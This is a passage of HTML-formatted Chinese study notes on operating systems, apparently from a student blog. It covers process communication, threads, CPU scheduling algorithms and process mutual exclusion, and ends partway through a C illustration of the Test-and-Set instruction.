aria-hidden="true">image-20231128000426318</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311272358262.png"alt="进程的唤醒和阻塞原语" /><figcaption aria-hidden="true">进程的唤醒和阻塞原语</figcaption></figure><h4 id="进程的切换原语">进程的切换原语</h4><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311280001800.png"alt="进程的切换原语" /><figcaption aria-hidden="true">进程的切换原语</figcaption></figure><p>无论哪个进程控制原语，要做的无非三类事情：</p><ol type="1"><li>更新PCB中的信息</li><li>将PCB插入合适的队列</li><li>分配/回收资源</li></ol><h2 id="进程通信">2.1.4 进程通信</h2><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311280012893.png"alt="为什么进程通信需要操作系统支持？" /><figcaptionaria-hidden="true">为什么进程通信需要操作系统支持？</figcaption></figure><p>进程通信是指进程之间的信息交换。进程的互斥与同步也归为进程通信；互斥与同步称为低级进程通信。</p><p>以信号量机制为例，它们之所以低级的原因在于：</p><p>①<strong>效率低</strong>，生产者每次只能向缓冲池投放一个产品(消息)，消费者每次只能从缓冲区中取得一个消息；</p><p>②<strong>通信对用户不透明</strong>，OS只为进程之间的通信提供了共享存储器。</p><p>在进程之间要传送大量数据时，应当利用OS提供的高级通信工具，这些工具最主要的特点是：</p><ol type="1"><li><p>使用方便：OS隐藏了实现进程通信的具体细节，向用户提供一组用于实现高级通信的命令(原语)；通信过程对用户是透明的，大大减少了通信程序编制上的复杂性。</p></li><li><p>高效地传送大量数据：用户可直接利用高级通信命令(原语)高效地传送大量的数据。</p></li></ol><h3 id="共享存储系统">共享存储系统</h3><p>共享一块大家都可以访问的空间，一次只能有一个进程进行读或写操作</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311280014990.png"alt="共享存储" /><figcaption aria-hidden="true">共享存储</figcaption></figure><h3 id="消息传递系统">消息传递系统</h3><p>发送信息的进程将消息头写好，接受信息进程根据消息头读取信息或寻找信封是哪一个</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311280019498.png"alt="image-20231128001938441" /><figcaption aria-hidden="true">image-20231128001938441</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311280021015.png"alt="消息传递（直接）" /><figcaption aria-hidden="true">消息传递（直接）</figcaption></figure><p>直接通信方式：点名道姓的消息传递</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311280022111.png"alt="消息传递（间接）" /><figcaption aria-hidden="true">消息传递（间接）</figcaption></figure><h3 id="管道通信系统">管道通信系统</h3><p>共享通信方式是写哪都可以，管道通信相当于一个队列（FIFO）</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312041012576.png"alt="管道通信系统" /><figcaption aria-hidden="true">管道通信系统</figcaption></figure><h2 id="线程概念与多线程模型">2.1.5 线程概念与多线程模型</h2><h3 id="线程概念">1. 线程概念</h3><h4 id="为什么要引入线程">为什么要引入线程？</h4><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312041015374.png"alt="为什么要引入线程？" /><figcaption aria-hidden="true">为什么要引入线程？</figcaption></figure><h4 id="什么是线程">什么是线程？</h4><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312041016703.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h4 id="引入线程带来的变化">引入线程带来的变化</h4><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312041018836.png"alt="引入线程带来的变化" /><figcaption aria-hidden="true">引入线程带来的变化</figcaption></figure><h3 id="线程的属性">2. 线程的属性</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312041018011.png"alt="线程的属性" /><figcaption aria-hidden="true">线程的属性</figcaption></figure><h3 id="线程的实现方式">3. 线程的实现方式</h3><ul><li>线程的实现分为两类：用户级线程(User-LevelThread,UTL)和内核级线程(Kernel-Level Thread,KTL)。内核级线程又称内核支持的线程。</li><li>内核级线程 KLT (Kernel-Level Thread)又称“内核支持的线程”：内核支持线程 KST (Kernel Supported Threads)</li></ul><p>历史背景：早期的操作系统 (如：早期Unix)只支持进程不支持线程。当时的“线程”是由线程库实现的</p><h4 id="用户级线程">用户级线程</h4><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312092137706.png"alt="用户级线程（ULT）" /><figcaption aria-hidden="true">用户级线程（ULT）</figcaption></figure><p>ULT线程方式的<strong>优点</strong>：</p><ol type="1"><li><p>线程切换不需要转换到内核空间，线程管理的系统开销小，效率高</p></li><li><p>调度算法可以是进程专用的</p></li><li><p>ULT线程的实现与OS平台无关，因为对于线程管理的代码是属于用户程序的一部分，所有的应用程序都可以对之进行共享。</p></li></ol><p>ULT线程方式的<strong>主要缺点</strong>：</p><ol type="1"><li>系统调用的阻塞问题</li></ol><p>在基于进程机制的OS中，当线程执行一个系统调用时，不仅该线程被阻塞，该进程内的所有线程会被阻塞。并发度不高。</p><ol start="2" type="1"><li>不能充分利用多处理机</li></ol><p>OS每次分配给一个进程的仅有一个CPU，因此，进程中仅有一个线程能执行，在该线程放弃CPU之前，进程中其它线程只能等待，即多个线程不可在多核处理机上并行运行</p><h4 id="内核级线程">内核级线程</h4><p>在内核空间为每一个内核线程设置了一个TCB，OS内核根据TCB来感知某线程的存在，并对其加以控制和管理</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312092142494.png"alt="内核级线程" /><figcaption aria-hidden="true">内核级线程</figcaption></figure><p>KST线程方式的四个主要优点：</p><ol type="1"><li>在多处理器系统中，内核能够同时调度同一进程中的多个线程并行执行；</li><li>如果进程中的某个线程被阻塞，内核可以调度该进程中的其它线程运行，也可以运行其它进程中的线程；</li><li>KLT（KST）线程具有很小的数据结构和堆栈，线程的切换比较快，切换开销小；</li><li>内核本身也可以采用多线程技术，可以提高系统的执行速度和效率。</li></ol><p>内核支持线程的主要缺点是：</p><p>对于用户的线程切换而言，其模式切换的开销较大，在同一个进程中，从一个线程切换到另一个线程时，需要从用户态转到核心态进行，这是因为用户进程的线程在用户态运行，而线程调度和管理是在内核实现的，系统开销较大。</p><blockquote><p>这里的两个切换，一个开销大，一个开销小，这里解释一下：优点说的是内核级线程之间的切换，缺点说的是用户级线程之间的切换</p></blockquote><h4 id="特殊的组合方式">特殊的组合方式</h4><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312092233931.png"alt="上面两种方式结合的组合方式" /><figcaption aria-hidden="true">上面两种方式结合的组合方式</figcaption></figure><h3 id="多线程模型">4. 多线程模型</h3><ul><li>前面我们提到了线程的实现方式，有用户级和内核级。那么这两种模式的交叉组合就会产生几种不一样的组织结构，即不一样的模型。</li></ul><p><strong>一对一模型</strong></p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312092236237.png"alt="一对一模型" /><figcaption aria-hidden="true">一对一模型</figcaption></figure><p><strong>多对一模型</strong></p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312092237384.png"alt="多对一模型" /><figcaption aria-hidden="true">多对一模型</figcaption></figure><p><strong>多对多模型</strong></p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312092238578.png"alt="多对多模型" /><figcaption aria-hidden="true">多对多模型</figcaption></figure><h2 id="线程的状态与转换">2.1.6 线程的状态与转换</h2><h3 id="线程的状态与转换-1">线程的状态与转换</h3><p>线程的状态与转换与进程的完全一致</p><ol type="1"><li><p>执行状态（或者叫运行状态）：表示线程已获得处理机而正在运行；</p></li><li><p>就绪状态：指线程已具备了各种执行条件，只须再获得CPU便可立即执行；</p></li><li><p>阻塞状态：指线程在执行中因某事件受阻而处于暂停状态，例如，当一个线程执行从键盘读入数据的系统调用时，该线程就被阻塞</p></li></ol><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312092241476.png"alt="线程的状态与转换" /><figcaption aria-hidden="true">线程的状态与转换</figcaption></figure><h3 id="线程控制块tcb">线程控制块TCB</h3><p>如同每个进程有一个进程控制块一样，系统也为每个线程配置了一个线程控制块ThreadControl Block(TCB)，将所有用于控制和管理线程的信息记录在线程控制块中</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312092243843.png"alt="线程控制块TCB" /><figcaption aria-hidden="true">线程控制块TCB</figcaption></figure><h1 id="处理机的调度">2.2 处理机的调度</h1><h2 id="处理机调度的概念及层次">2.2.1 处理机调度的概念及层次</h2><h3 id="调度的基本概念">1. 调度的基本概念</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312092247567.png"alt="调度的基本概念" /><figcaption aria-hidden="true">调度的基本概念</figcaption></figure><h3 id="调度的三个层次">2. 调度的三个层次</h3><h4 id="高级调度作业调度">高级调度（作业调度）</h4><p>作业后备队列：</p><p>作业：一个具体的任务，用户向系统提交一个作业 ≈用户让操作系统启动一个程序（来处理一个具体的任务）</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312092252526.png"alt="高级调度（作业调度）" /><figcaption aria-hidden="true">高级调度（作业调度）</figcaption></figure><p>高级调度主要用于多道批处理系统中，在分时和实时系统中不设置高级调度。</p><blockquote><p>高级调度简化理解：好几个程序需要启动，到底先启动哪个</p></blockquote><h4 id="低级调度进程调度">低级调度（进程调度）</h4><p>低级调度所调度的对象是进程（或内核级线程）。</p><p>进程调度是最基本的一种调度，在多道批处理、分时和实时二种类型的OS中，都必须配置这级调度。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312092256398.png"alt="低级调度（进程调度）" /><figcaption aria-hidden="true">低级调度（进程调度）</figcaption></figure><h4 id="中级调度内存调度">中级调度（内存调度）</h4><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312092300921.png"alt="中级调度（内存调度）" /><figcaption aria-hidden="true">中级调度（内存调度）</figcaption></figure><h4 id="进程的七状态模型">进程的七状态模型</h4><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312092301899.png"alt="进程的七状态模型" /><figcaption aria-hidden="true">进程的七状态模型</figcaption></figure><h3 id="三层调度的联系和对比">3. 三层调度的联系和对比</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312092302116.png"alt="三层调度的联系和对比" /><figcaption aria-hidden="true">三层调度的联系和对比</figcaption></figure><h2 id="进程调度的时机切换与过程方式">2.2.2进程调度的时机、切换与过程、方式</h2><h3 id="进程调度的时机">进程调度的时机</h3><p>（1）什么时候进行进程调度？</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312092311354.png"alt="什么时候进行进程调度？" /><figcaption aria-hidden="true">什么时候进行进程调度？</figcaption></figure><p>（2）什么时候不能进行进程调度？</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312101012847.png"alt="什么时候不能进行进程调度？" /><figcaption aria-hidden="true">什么时候不能进行进程调度？</figcaption></figure><p>（3）OS内核程序临界区与普通临界区的进程调度情况</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312101017358.png"alt="OS内核程序临界区与普通临界区的进程调度情况" /><figcaptionaria-hidden="true">OS内核程序临界区与普通临界区的进程调度情况</figcaption></figure><p>内核程序临界区是会上一个🔒，然后独自占用资源，并且其他的进程是无法进去就绪队列的</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312101018703.png"alt="OS内核程序临界区与普通临界区的进程调度情况" /><figcaptionaria-hidden="true">OS内核程序临界区与普通临界区的进程调度情况</figcaption></figure><p>一些IO设备，如打印机，因为这类的设备处理会很慢很慢，总不可能一直等待打印机工作结束</p><p>一个是临界区，一个是内核临界区，临界区是大范围，内核临界区是小范围</p><h3 id="进程调度的方式">进程调度的方式</h3><p>在进程调度的时机“（1）什么时候进行进程调度？”中，有的系统中，只允许进程主动放弃处理机，而有的系统中，进程可以主动放弃处理机，当有更紧急的任务需要处理时，也会强行剥夺处理机（被动放弃）</p><p>这就引出了进程调度的两种方式——非剥夺与剥夺</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312101025696.png"alt="进程调度的方式" /><figcaption aria-hidden="true">进程调度的方式</figcaption></figure><h3 id="进程的切换和过程">进程的切换和过程</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312101027326.png"alt="进程的切换和过程" /><figcaption aria-hidden="true">进程的切换和过程</figcaption></figure><h2 id="调度程序和闲逛程序">2.2.3 调度程序和闲逛程序</h2><h3 id="调度程序">调度程序</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312101034396.png"alt="调度器/调度程序" /><figcaption aria-hidden="true">调度器/调度程序</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312101034769.png"alt="image-20231210103451666" /><figcaption aria-hidden="true">image-20231210103451666</figcaption></figure><h3 id="闲逛进程">闲逛进程</h3><p>调度程序永远的备胎，没有其他就绪进程时，运行闲逛进程 (idle)</p><p>闲逛进程的特性：</p><ul><li>优先级最低</li><li>可以是0地址指令，占一个完整的指令周期(指令周期末尾例行检查中断)</li><li>能耗低</li></ul><h2 id="调度算法的评价指标">2.2.4 调度算法的评价指标</h2><h3 id="cpu利用率">1. CPU利用率</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312101038132.png"alt="CPU利用率" /><figcaption aria-hidden="true">CPU利用率</figcaption></figure><h3 id="系统吞吐量">2. 系统吞吐量</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312101039962.png"alt="系统吞吐量" /><figcaption aria-hidden="true">系统吞吐量</figcaption></figure><h3 id="周转时间">3. 周转时间</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312101041879.png"alt="周转时间-平均周转时间" /><figcaption aria-hidden="true">周转时间-平均周转时间</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312101042046.png"alt="带权周转时间" /><figcaption aria-hidden="true">带权周转时间</figcaption></figure><p>带权周转时间其实表示的是进程的周转时间比运行时间大多少倍的这样一个指标</p><h3 id="等待时间">4. 等待时间</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312101049567.png"alt="等待时间" /><figcaption aria-hidden="true">等待时间</figcaption></figure><h3 id="响应时间">5. 响应时间</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312101049703.png"alt="响应时间" /><figcaption aria-hidden="true">响应时间</figcaption></figure><h2 id="作业进程调度算法1">2.2.5 作业/进程调度算法1</h2><h3 id="思维导图">0. 思维导图</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312101050430.png"alt="调度算法学习思路" /><figcaption aria-hidden="true">调度算法学习思路</figcaption></figure><h3 id="先来先服务--fcfs">1. 先来先服务--FCFS</h3><ul><li>First Come First Serve</li></ul><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312101058223.png"alt="先来先服务--FCFS" /><figcaption aria-hidden="true">先来先服务--FCFS</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312101058654.png"alt="先来先服务(FCFS)例题" /><figcaption aria-hidden="true">先来先服务(FCFS)例题</figcaption></figure><h3 id="短作业优先--sjf">2. 短作业优先--SJF</h3><ul><li>Shortest Job First</li></ul><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312101111700.png"alt="短作业优先--SJF" /><figcaption aria-hidden="true">短作业优先--SJF</figcaption></figure><p><strong>非抢占式—SJF：</strong></p><p>其实这里应该叫短进程优先---SPF，但是很多时候题目也不区分这两个了</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312101103547.png"alt="非抢占式—SJF例题" /><figcaption aria-hidden="true">非抢占式—SJF例题</figcaption></figure><p><strong>抢占式—SJF（SRTN）：</strong></p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312101107164.png"alt="抢占式—SJF（SRTN）" /><figcaption aria-hidden="true">抢占式—SJF（SRTN）</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312101108438.png"alt="抢占式—SJF（SRTN）各种时间计算" /><figcaptionaria-hidden="true">抢占式—SJF（SRTN）各种时间计算</figcaption></figure><p>注意几个细节：</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312101110507.png"alt="image-20231210111022273" /><figcaption aria-hidden="true">image-20231210111022273</figcaption></figure><h3 id="高响应比优先--hrrn">3. 高响应比优先--HRRN</h3><ul><li>Highest Response Ratio Next</li></ul><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312101114044.png"alt="思考中……" /><figcaption aria-hidden="true">思考中……</figcaption></figure><blockquote><p>byd看一个多小时qing有点小累了🥱🥱🥱，2023.12.10 11:15</p></blockquote><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312101117977.png"alt="高响应比优先--HRRN" /><figcaption aria-hidden="true">高响应比优先--HRRN</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312101116056.png"alt="高响应比优先--HRRN例题" /><figcaption aria-hidden="true">高响应比优先--HRRN例题</figcaption></figure><h3 id="三种算法的对比和总结">4. 三种算法的对比和总结</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312101119679.png"alt="三种算法的对比和总结" /><figcaption aria-hidden="true">三种算法的对比和总结</figcaption></figure><h2 id="作业进程调度算法2">2.2.6 作业/进程调度算法2</h2><h3 id="思维导图-1">0.思维导图</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312101120953.png"alt="作业/进程调度算法2" /><figcaption aria-hidden="true">作业/进程调度算法2</figcaption></figure><h3 id="时间片轮转--rr">1. 时间片轮转--RR</h3><ul><li>Round-Robin</li></ul><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312101135481.png"alt="时间片轮转--RR" /><figcaption aria-hidden="true">时间片轮转--RR</figcaption></figure><p>时间片大小为2举例</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312101124113.png"alt="1" /><figcaption aria-hidden="true">1</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312101126838.png"alt="2" /><figcaption aria-hidden="true">2</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312101128750.png"alt="3" /><figcaption aria-hidden="true">3</figcaption></figure><p>时间片大小为5举例</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312101130158.png"alt="1" /><figcaption aria-hidden="true">1</figcaption></figure><p>可能出现的问题，与FCFS对比</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312101133785.png"alt="RR与FCFS对比" /><figcaption aria-hidden="true">RR与FCFS对比</figcaption></figure><p>如果时间片太大，使得每个进程都可以在一个时间片内就完成，则时间片轮转调度算法退化为先来先服务调度算法，并且会增大进程响应时间。因此时间片不能太大。</p><ul><li>比如：系统中有10个进程在并发执行，如果时间片为1秒，则一个进程被响应可能需要等9秒...也就是说，如果用户在自己进程的时间片外通过键盘发出调试命令，可能需要等待9秒才能被系统响应</li></ul><p>另一方面，进程调度、切换是有时间代价的(保存、恢复运行环境)，因此如果时间片太小，会导致进程切换过于频繁，系统会花大量的时间来处理进程切换，从而导致实际用于进程执行的时间比例减少。可见时间片也不能太小。</p><p>一般来说，设计时间片时要让切换进程的开销占比不超过1%</p><h3 id="优先级调度算法">2. 优先级调度算法</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312101145451.png"alt="优先级调度算法" /><figcaption aria-hidden="true">优先级调度算法</figcaption></figure><p>用于作业调度的时候，选择一个处于外存后备队列当中的作业，进入内存</p><p>用于进程调度的时候，选择一个在内存的就绪队列当中的进程，为它分配处理机</p><p>非抢占式例子：</p><p>这里的优先数越大，优先级越高<strong>只是本题规定的</strong></p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312101140170.png"alt="优先级调度算法-非抢占式例子" /><figcaption aria-hidden="true">优先级调度算法-非抢占式例子</figcaption></figure><p>抢占式例子：</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312101142267.png"alt="优先级调度算法-抢占式例子" /><figcaption aria-hidden="true">优先级调度算法-抢占式例子</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312101144369.png"alt="补充一点点喵" /><figcaption aria-hidden="true">补充一点点喵</figcaption></figure><h3 id="多级反馈队列调度算法">3. 多级反馈队列调度算法</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312101150481.png"alt="思考🤔" /><figcaption aria-hidden="true">思考🤔</figcaption></figure><ul><li>Multileveled Feedback Queue</li></ul><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312101217786.png"alt="多级反馈队列调度算法" /><figcaption aria-hidden="true">多级反馈队列调度算法</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312101216309.png"alt="多级反馈队列调度算法例题" /><figcaption aria-hidden="true">多级反馈队列调度算法例题</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312101214114.gif"alt="多级反馈队列调度算法调度过程" /><figcaption aria-hidden="true">多级反馈队列调度算法调度过程</figcaption></figure><h3 id="三种算法的对比总结">4. 三种算法的对比总结</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312101219993.png"alt="三种算法的对比总结" /><figcaption aria-hidden="true">三种算法的对比总结</figcaption></figure><h3 id="补充多队列调度算法">5. 补充：多队列调度算法</h3><ul><li>Multilevel queue scheduling</li></ul><p>单个就绪队列无法满足用户对进程调度策略的不同要求；将就绪队列分成多个队列，提出多级队列调度算法</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312101222441.png"alt="多队列调度算法" /><figcaption aria-hidden="true">多队列调度算法</figcaption></figure><p>固定优先级：一般不用固定优先级，比如你打字打着打着有个系统进程要运行，那你就不能打字了</p><p>时间片划分，比如100ms，那么在这100ms每个优先级的进程都会被至少响应一次</p><h1 id="进程的同步与互斥">2.3 进程的同步与互斥</h1><h2 id="进程的同步与互斥-1">2.3.1 进程的同步与互斥</h2><h3 id="进程同步">1. 进程同步</h3><p>知识点回顾：进程具有异步性的特征。异步性是指，各并发执行的进程以各自独立的、不可预知的速度向前推进。</p><ul><li><strong>同步也称为直接制约关系，它是指为完成某种任务而建立的两个或多个进程，这些进程因为需要在某些位置上协调它们的工作次序而产生的制约关系</strong>。进程间的直接制约关系就是源于它们之间的相互合作。</li><li>进程同步是为了解决进程的异步问题。</li></ul><blockquote><p>一个简单的例子来理解这个概念。 例如，让系统计算1 + 2 *3，假设系统产生两个进程:一个是加法进程，一个是乘法进程。要让计算结果是正确的，一定要让加法进程发生在乘法进程之后，但实际上操作系统具有异步性，若不加以制约，加法进程发生在乘法进程之前是绝对有可能的，因此要制定一定的机制去约束加法进程，让它在乘法进程完成之后才发生。</p></blockquote><h3 id="进程互斥">2. 进程互斥</h3><ul><li>互斥，亦称间接制约关系。</li><li><strong>进程互斥指当一个进程访问某临界资源时，另一个想要访问该临界资源的进程必须等待。当前访问临界资源的进程访问结束，释放该资源之后，另一个进程才能去访问临界资源。</strong></li></ul><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312102041440.png"alt="进程互斥" /><figcaption aria-hidden="true">进程互斥</figcaption></figure><ul><li>临界资源(Critical Resouce)<ul><li>许多硬件资源如打印机、 磁带机等，都属于临界资源</li><li>进程间应采取互斥方式，实现对这类资源的共享。</li><li>软件资源如信号量，共享变量等</li></ul></li><li>临界区(critical section)<ul><li>不论是硬件临界资源还是软件临界资源，多个进程必须互斥地对它进行访问；每个进程中访问临界资源的那段代码称为临界区。</li></ul></li></ul><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312102043787.png"alt="image-20231210204357574" /><figcaption aria-hidden="true">image-20231210204357574</figcaption></figure><p>为了禁止两个进程同时进入<code>临界区</code>，实现对临界资源的互斥访问，同时保证系统整体性能，需要遵循以下原则：</p><ol type="1"><li>空闲让进。临界区空闲时，可以允许一个请求进入临界区的进程立即进入临界区</li><li>忙则等待。当已有进程进入临界区时，其他试图进入临界区的进程必须等待</li><li>有限等待。对请求访问的进程，应保证能在有限时间内进入临界区(保证不会饥饿)</li><li>让权等待。当进程不能进入临界区时，应立即释放处理机，防止进程忙等待</li></ol><h2 id="进程互斥的软件实现方法">2.3.2 进程互斥的软件实现方法</h2><blockquote><p>这部分书上其实就一句话：软件方法能解决诸如进程互斥进入临界区的问题，但有一定难度，并且存在很大的局限性，因而现在已很少采用。</p><p>所以期末考试是不会考的，但王道讲了的话说明在408的范围内🧐🧐</p></blockquote><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312102057658.png"alt="进程互斥的软件实现方法" /><figcaption aria-hidden="true">进程互斥的软件实现方法</figcaption></figure><h3 id="单标志法">1. 单标志法</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312102107598.png"alt="单标志法" /><figcaption aria-hidden="true">单标志法</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312102108192.png"alt="单标志法" /><figcaption aria-hidden="true">单标志法</figcaption></figure><h3 id="双标志先检查法">2. 双标志先检查法</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312102112579.png"alt="双标志先检查法" /><figcaption aria-hidden="true">双标志先检查法</figcaption></figure><p>如果能让 “检查” 和“上锁”一气呵成，那其实这个算法就没啥问题了，下一小节的硬件实现方法就实现了</p><h3 id="双标志后检查法">3. 双标志后检查法</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312102114531.png"alt="双标志后检查法" /><figcaption aria-hidden="true">双标志后检查法</figcaption></figure><h3 id="peterson算法">4. Peterson算法</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312102120741.png"alt="Peterson算法" /><figcaption aria-hidden="true">Peterson算法</figcaption></figure><p>Peterson算法用软件方法解决了进程互斥问题，遵循了空闲让进、忙则等待、有限等待三个原则，但是依然未遵循<strong>让权等待</strong>的原则。</p><p>Peterson算法相较于之前三种软件解决方案来说，是最好的，但依然不够好。</p><h2 id="进程互斥的硬件实现方法">2.3.3 进程互斥的硬件实现方法</h2><h3 id="中断屏蔽方法">1. 中断屏蔽方法</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312102125013.png"alt="中断屏蔽方法" /><figcaption aria-hidden="true">中断屏蔽方法</figcaption></figure><p>关中断方法的缺点：</p><p>① 滥用关中断权力可能导致严重后果；</p><p>②关中断时间过长，会影响系统效率，限制了处理器交叉执行程序的能力；</p><p>③不适用于多CPU系统，因为在一个处理器上关中断并不能防止进程在其它处理器上执行相同的临界段代码。</p><h3 id="test-and-set指令">2. Test-and-Set指令</h3><p><code>TestAndSet</code> 简称 <code>TS</code> 指令，也有地方称为<code>TestAndSetLock</code> 指令，或 <code>TSL</code> 指令</p><p><code>TSL</code>指令是用硬件实现的，执行的过程不允许被中断，只能一气呵成。</p><p>以下是用C语言描述的逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 布尔型共享变量 lock 表示当前临界区是否被加锁</span><br><span class="hljs-comment">// true 表示已经加锁， false 表示未加锁</span><br><span class="hljs-type">bool</span> <span class="hljs-title function_">TestAndSet</span><span class="hljs-params">(<span class="hljs-type">bool</span> *lock)</span><br>&#123;<br>    <span class="hljs-type">bool</span> old;            <br>    old = *lock;          <span class="hljs-comment">// 用于存放lock 原来的值</span><br>    *lock = <span class="hljs-literal">true</span>;         <span class="hljs-comment">// 无论之前是否已经加锁，都将lock值设为true</span><br>    <span class="hljs-keyword">return</span> old;           <span class="hljs-comment">// 返回lock原来的值</span><br>&#125;<br></code></pre></td></tr></table></figure><p>以下是使用TSL指令，实现互斥的算法逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 